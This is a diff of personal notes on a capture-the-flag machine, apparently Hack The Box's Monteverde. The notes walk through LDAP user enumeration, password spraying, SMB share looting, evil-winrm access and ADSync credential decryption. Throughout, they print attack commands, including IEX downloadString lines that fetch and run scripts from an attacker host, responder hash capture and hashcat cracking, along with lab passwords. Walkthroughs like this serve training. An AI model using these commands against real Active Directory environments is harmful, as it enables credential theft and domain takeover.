@@ -2,7 +2,7 @@
 - 
 ## Nmap Enumeration
 - We pass the commands:
-```bash
+	```bash
 nmap -sV -sC -vv 10.10.10.172
 nmap -sU --top-ports=10 -vv 10.10.10.172
 
@@ -45,15 +45,15 @@ PORT     STATE         SERVICE      REASON
 53/udp   open          domain       udp-response ttl 127
 123/udp  open          ntp          udp-response ttl 127
 ```
-- Domain : megabank.local
-- smb, rpc, ldap, kerberos, 
+	- Domain : megabank.local
+	- smb, rpc, ldap, kerberos, 
 ----
 ## SMB Enumeration
 - Don't get anything with null, guest and anonymous authentication
 ---
 ## LDAPsearch
 - Performing LDAP anonymous authentication:
-```bash
+	```bash
 ldapsearch -x -H ldap://10.10.10.172 -s base namingcontexts
 
 ---OUTPUT---
@@ -81,7 +81,7 @@ result: 0 Success
 # numEntries: 1
 ```
 - Then using the DC information I query LDAP:
-```bash
+	```bash
 ldapsearch -x -H ldap://10.10.10.172 -b "DC=megabank,DC=local"
 ldapsearch -x -H ldap://10.10.10.172 -b "DC=megabank,DC=local" | grep "Password" #grep "password"
 ldapsearch -x -H ldap://10.10.10.172 -b "DC=megabank,DC=local" | grep "sAMAccountName"
@@ -105,10 +105,10 @@ dgalanos
 roleary
 smorgan
 ```
-- Should note I also saw that user SABatchJobs had a badpassword value which wasn't 0 ( using the grep "password" -A10 -B10 command)
+	- Should note I also saw that user SABatchJobs had a badpassword value which wasn't 0 ( using the grep "password" -A10 -B10 command)
 
 - I then use crackmapexec to spray each user with its own username as password:
-```bash
+	```bash
 crackmapexec smb 10.10.10.172 -u fixedldapuser -p fixedldapuser --no-bruteforce
 
 ---OUTPUT---
@@ -120,9 +120,9 @@ SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7
 SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
 SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
 ```
-- We get a hit for SABatchJobs
+	- We get a hit for SABatchJobs
 - We check shares :
-```bash
+	```bash
 crackmapexec smb 10.10.10.172 -u SABatchJobs -p SABatchJobs --shares
 
 ---OUTPUT---
@@ -140,12 +140,12 @@ SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ        
 SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share 
 SMB         10.10.10.172    445    MONTEVERDE       users$          READ            
 ```
-- 3 non default shares:
-- azure_uploads
-- E$
-- users$
+	- 3 non default shares:
+		- azure_uploads
+		- E$
+		- users$
 - I access users$
-```bash
+	```bash
 smbclient -U 'SABatchJobs' //10.10.10.172/users$ --password='SABatchJobs'
 smb: \> cd mhope\
 smb: \mhope\> dir
@@ -159,7 +159,7 @@ smb: \mhope\> get azure.xml
 ```
 - azure_uploads share has nothing
 - We read azure.xml
-```xml
+	```xml
 cat azure.xml
 
 ---OUTPUT---
@@ -179,18 +179,18 @@ cat azure.xml
   </Obj>
 </Objs> 
 ```
-- We get a password  `4n0therD4y@n0th3r$`
+	- We get a password  `4n0therD4y@n0th3r$`
 - As it's spraying I don't check for password lockout policy..although to be fair we can guess which user as we grabbed this file from a directory called mhope in a share called users.
 - Spray the password with our known users:
-- crackmapexec/netexec
-```bash
+	- crackmapexec/netexec
+		```bash
 crackmapexec winrm 10.10.10.172 -u fixedldapuser -p 4n0therD4y@n0th3r$
 
 ---RELEVANT-OUTPUT---
 WINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
 ```
 - We evil-winrm into the target with these credentials:
-```bash
+	```bash
 evil-winrm -u 'mhope' -p '4n0therD4y@n0th3r$' -i 10.10.10.172
 
 ---OUTPUT---
@@ -204,9 +204,9 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\mhope\Documents> whoami
 megabank\mhope
 ```
-- We can grab the user flag
+	- We can grab the user flag
 - upload winPEASany.exe
-```bash
+	```bash
 ---JUST-WHAT-CAUGHT-MY-EYE---
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Cloud Credentials
 È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials                                                                                                                                                                                        
@@ -223,8 +223,8 @@ megabank\mhope
 
 ```
 - If we check Program Files we see AD Sync and if we google `azure "ADSync" privilege escalation` we find this in the second link
-- https://blog.xpnsec.com/azuread-connect-for-redteam/
-```bash
+	- https://blog.xpnsec.com/azuread-connect-for-redteam/
+	```bash
 *Evil-WinRM* PS C:\Program Files> dir
 
 ---RELEVANT-OUTPUT---
@@ -244,7 +244,7 @@ d-----         1/2/2020   2:38 PM                Microsoft SQL Server
 d-----         1/2/2020   2:25 PM                Microsoft Visual Studio 10.0
 ```
 - We also see our user is part of Azure Admins group
-```bash
+	```bash
 *Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync> net user mhope
 
 ---OUTPUT---
@@ -274,10 +274,10 @@ Local Group Memberships      *Remote Management Use
 Global Group memberships     *Azure Admins         *Domain Users
 The command completed successfully.
 ```
-- This would give us access to the azure database
+	- This would give us access to the azure database
 - From the link above, under PSH we see a code that can retrieve the plaintext password.
 - We copy it to a file decrypt.ps1 and import it via IEX
-```bash
+	```bash
 cat decrypt.ps1
 
 ---OUTPUT---
@@ -316,13 +316,13 @@ cat decrypt.ps1
 |Write-Host ("Username: " + $username.Username)|
 Write-Host ("Password: " + $password.Password)
 ```
-- Opens database, gets keyset_id, instance_id, entropy FROM mms_server_configuration
-- Can run these commands on sqlcmd (shown at bottom of notes)
-- Assigning each of them to a variable and we clode the reader
-- Then we run a second command to get  private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'
-- After which it calls mcrypt.dll, calls LoadKeySet. GetActiveCredentialKey and DecryptBase64ToString functions to decrypt the password.
+	- Opens database, gets keyset_id, instance_id, entropy FROM mms_server_configuration
+		- Can run these commands on sqlcmd (shown at bottom of notes)
+	- Assigning each of them to a variable and we clode the reader
+	- Then we run a second command to get  private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'
+	- After which it calls mcrypt.dll, calls LoadKeySet. GetActiveCredentialKey and DecryptBase64ToString functions to decrypt the password.
 - Uploading via IEX:
-```bash
+	```bash
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8001/decrypt.ps1')
 
 ---OUTPUT-ERROR--- 
@@ -331,8 +331,8 @@ Error: An error of type WinRM::WinRMWSManFault happened, message is [WSMAN ERROR
 Error: Exiting with code 
 ```
 - Trying to identify the error:
-- We pass these commands one by one onto the target powershell:
-```bash
+	- We pass these commands one by one onto the target powershell:
+		```bash
 *Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
 *Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> $client.Open()
 
@@ -346,54 +346,54 @@ At line:1 char:1
 
 
 ```
-- The shell gets stuck here. and eventually returns an error The error probably lies in opening connection to SQL
-- but our database is local..so maybe a better command should work
-- Changing the Data Source to localhost
-```bash
+		- The shell gets stuck here. and eventually returns an error The error probably lies in opening connection to SQL
+			- but our database is local..so maybe a better command should work
+			- Changing the Data Source to localhost
+				```bash
 $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=localhost\.\ADSync;Initial Catalog=ADSync"
 ```
-- It fails
+	- It fails
 - I search online for this string " Data Source=(localdb)"
-- Showed me a microsoft link to SQL talking about SQL Connection String
+	- Showed me a microsoft link to SQL talking about SQL Connection String
 - I then searched for SQL Connection String alternative and came across this link:
-- https://www.connectionstrings.com/sql-server/
-- I found a command that could work and replaced the command argument with this :
-```bash
+	- https://www.connectionstrings.com/sql-server/
+		- I found a command that could work and replaced the command argument with this :
+			```bash
 "Server=localhost;Database=ADSync;Trusted_Connection=True;"
 ```
-- On checking on the target powershell the connection could be opened. 
+			- On checking on the target powershell the connection could be opened. 
 - I then edited decrypt.ps1 and replaced the first command with this argument (alternatively I saw Ippsec's video and he used another argument which took reference from this link : https://mcpmag.com/articles/2018/12/10/test-sql-connection-with-powershell.aspx)
-- Fixing decrypt.ps1
-```bash
+	- Fixing decrypt.ps1
+		```bash
 $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList “Server=LocalHost;Database=ADSync;Trusted_Connection=True;”
 --OR-IPPSEC-
 $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=localhost;Integrated Security=true;Initial Catalog=ADSync"
 ```
 - I then again loaded the file using IEX on target powershell:
-```bash
+	```bash
 -----
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:80/decrypt.ps1')
 Domain: MEGABANK.LOCAL
 Username: administrator
 Password: d0m@in4dminyeah!
 ```
-- We get domain password.
+	- We get domain password.
 ## Alternate method
 - The walkthrough also talks of another way to exploit
-- Directed me to this repo: https://github.com/VbScrub/AdSyncDecrypt/releases
-- unzipped it on my local machine and uploaded it to target
-```bash
+	- Directed me to this repo: https://github.com/VbScrub/AdSyncDecrypt/releases
+		- unzipped it on my local machine and uploaded it to target
+			```bash
 unzip AdDecrpt.zip
 ```
-- As documentation states, make sure the dll files and exe are in the same directory and our current directory must be `C:\Program Files\Microsoft Azure AD Sync\Bin`
-```bash
+			- As documentation states, make sure the dll files and exe are in the same directory and our current directory must be `C:\Program Files\Microsoft Azure AD Sync\Bin`
+				```bash
 cd C:\Users\mhope\Documents
 upload AdDecrypt.exe
 upload mcrypt.dll
 cd "C:\Program Files\Microsoft Azure AD Sync\Bin"
 ```
 - We can then execute the command with `-FullSQL` argument to retrieve the password:
-```bash
+	```bash
 *Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> C:\Users\mhope\Documents\AdDecrypt.exe -FullSQL
 
 ---OUTPUT---
@@ -414,14 +414,14 @@ Username: administrator
 Password: d0m@in4dminyeah!
 Domain: MEGABANK.LOCAL
 ```
--  We get admin password
+	-  We get admin password
 -------
 --------
 ## Extras
 - Can grab the mcrypt.dll files (as that's the file that is used to grab the creds) and analyze it using DnSpy on windows
-- There we can see the functions that the commands in our code (decrypt.ps1) calls
+	- There we can see the functions that the commands in our code (decrypt.ps1) calls
 - **SQLCMD** seems to work (we can see it running is we pass `ps` command or if we saw it in the ldapsearch dump)
-```bash
+	```bash
 # To see all commands we can run
 sqlcmd -?
 
@@ -458,8 +458,8 @@ usage: Sqlcmd            [-U login id]          [-P password]
   [-G use Azure Active Directory for authentication]
   [-? show syntax summary]
 ```
-- `-Q` for a command line query
-```bash
+	- `-Q` for a command line query
+		```bash
 sqlcmd -Q "select * from sys.databases"
 
 ---OUTPUT---
@@ -469,9 +469,9 @@ name                                                                            
 ...
 ..
 ```
-- Gives a big output but not really readable. we do see id's, database name etc in the top
-- Then pass:
-```bash
+		- Gives a big output but not really readable. we do see id's, database name etc in the top
+	- Then pass:
+		```bash
 sqlcmd -Q "select name,create_date from sys.databases"
 
 ---OUTPUT---
@@ -486,16 +486,16 @@ ADSync                                                                          
 (5 rows affected)
 
 ```
-- We see ADSync database was created in 2020 which is probably related to our ctf
-- Alternatively we can use PowerUpSQL if we aren't too good with mssql commands:
-- https://github.com/NetSPI/PowerUpSQL
-- for commands  : https://www.netspi.com/blog/technical-blog/network-pentesting/powerupsql-powershell-toolkit-attacking-sql-server/ OR https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
-- We clone it and import the module in target with IEX (while having http server running on directory with PowerUpSQL.ps1)
-```bash
+		- We see ADSync database was created in 2020 which is probably related to our ctf
+	- Alternatively we can use PowerUpSQL if we aren't too good with mssql commands:
+		- https://github.com/NetSPI/PowerUpSQL
+			- for commands  : https://www.netspi.com/blog/technical-blog/network-pentesting/powerupsql-powershell-toolkit-attacking-sql-server/ OR https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
+			- We clone it and import the module in target with IEX (while having http server running on directory with PowerUpSQL.ps1)
+				```bash
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:80/PowerUpSQL.ps1')
 ```
-- We pass the command (Fails):
-```bash
+		- We pass the command (Fails):
+			```bash
  Get-SQLInstanceLocal -Verbose
 ---OUTPUT-FAIL---
 Access denied 
@@ -505,8 +505,8 @@ At line:14737 char:24
     + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
     + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand
 ```
-- We then try:
-```bash
+		- We then try:
+			```bash
 Invoke-SQLAudit -Verbose
 
 ---RELEVANT-OUTPUT---
@@ -527,10 +527,10 @@ Reference     : https://blog.netspi.com/executing-smb-relay-attacks-via-sql-serv
 Author        : Scott Sutherland (@_nullbind), NetSPI 2016
 
 ```
-- Basically like winPEAS for mssql
-- We see we can use xp_dirtree
+	- Basically like winPEAS for mssql
+	- We see we can use xp_dirtree
 - We listen with responder on our interface and when we pass the next command we get a hash:
-```bash
+	```bash
 sudo responder -i tun0
 
 ---RELEVANT-OUTPUT---
@@ -542,32 +542,32 @@ sudo responder -i tun0
 [*] Skipping previously captured hash for MEGABANK\MONTEVERDE$
 [*] Skipping previously captured hash for MEGABANK\MONTEVERDE$
 ```
-- We pass the command:
-```bash
+	- We pass the command:
+		```bash
 sqlcmd -Q "xp_dirtree '\\10.10.14.25\test'"
 ```
-- We can attempt to crack it with hashcat but it will fail (it's a machine account so password is complex):
-```bash
+	- We can attempt to crack it with hashcat but it will fail (it's a machine account so password is complex):
+		```bash
 hashcat -m 5600 monteverde.hash /usr/share/wordlists/rockyou.txt -r rules/base64.rule
 hashcat -m 5600 monteverde.hash /usr/share/wordlists/rockyou.txt -r rules/InsidePro-PasswordsPro.rule
 ```
 
-- Using SQLCMD Ippsec tried to use xp_cmdshell and hsot an smbshare to grab an NTHash but since its a machine account it's very unlikely it could be cracked.
-- Nevertheless a lot of the commands explain what decrypt.ps1 code is doing like the Database we look in etc.
+	- Using SQLCMD Ippsec tried to use xp_cmdshell and hsot an smbshare to grab an NTHash but since its a machine account it's very unlikely it could be cracked.
+		- Nevertheless a lot of the commands explain what decrypt.ps1 code is doing like the Database we look in etc.
 - The user AAD_987d7f2f57d2 is an AD sync thing sync thing to sync pwds between Azure and on premise DC
 - Check password policy 
-```bash
+	```bash
 crackmapexec smb 10.10.10.172 --pas-pol
 ```
 - Instead of using smbclient we can use smbmap to enumerate and download our azure.xml file
-```bash
+	```bash
 smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172 -R # List all files in all directories
 smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172 --download users4/mhope/azure.xml
 ```
 - Regarding the decrypt.ps1 code:
-- - With sqlcmd we can also check the data in these databases:
-- test
-```bash
+	- - With sqlcmd we can also check the data in these databases:
+	- test
+		```bash
 sqlcmd -Q "Use ADSync; select keyset_id, instance_id, entropy FROM mms_server_configuration"
 
 ---OUTPUT---
@@ -578,9 +578,9 @@ keyset_id   instance_id                          entropy
 
 (1 rows affected)
 ```
-- Probably entopy is a salt? decryption requires static key + salt which is entropy and is why we are grabbing it in the code
-- We then pass:
-```bash
+		- Probably entopy is a salt? decryption requires static key + salt which is entropy and is why we are grabbing it in the code
+	- We then pass:
+		```bash
 sqlcmd -Q "Use ADSync; SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
 
 ---OUTPUT---
@@ -598,8 +598,8 @@ private_configuration_xml                                                       
 ```
 
 - **Whats actually happening**
-- the code decrypt.ps1 is grabbing the following 2 commands data.
-```bash
+	- the code decrypt.ps1 is grabbing the following 2 commands data.
+		```bash
 sqlcmd -Q "Use ADSync; select private_configuration_xml FROM
 mms_management_agent"
 
@@ -625,8 +625,8 @@ private_configuration_xml
 
 (2 rows affected)
 ```
-- Can also see encrypted data as well:
-```bash
+	- Can also see encrypted data as well:
+		```bash
 sqlcmd -Q "Use ADSync; select private_configuration_xml,encrypted_configuration FROM mms_management_agent"
 ---OUTPUT---
 Changed database context to 'ADSync'.
@@ -651,8 +651,8 @@ private_configuration_xml                                                       
 (2 rows affected)
 
 ```
-- Also shows encrypted password ( can base64 -d | xxd it to see it's unreadable)
-- So the code basically calls this and then uses mcrypt.dll internal commands to decrypt.
-- Probably encrypted with a static string (as that's what orgs usually like doing) as AzureAD needs to be able to decrypt it
+		- Also shows encrypted password ( can base64 -d | xxd it to see it's unreadable)
+	- So the code basically calls this and then uses mcrypt.dll internal commands to decrypt.
+		- Probably encrypted with a static string (as that's what orgs usually like doing) as AzureAD needs to be able to decrypt it
 - Ippsec does some extra enumeration analyzing mcrypt.dll with mcrypt.dll and then used DNSZone to check IP which was interesting to watch and learn even if just to see the thought process.
-- the dnszone is useful if you want to see the dns records to find all hostnames of the zone.
+	- the dnszone is useful if you want to see the dns records to find all hostnames of the zone.
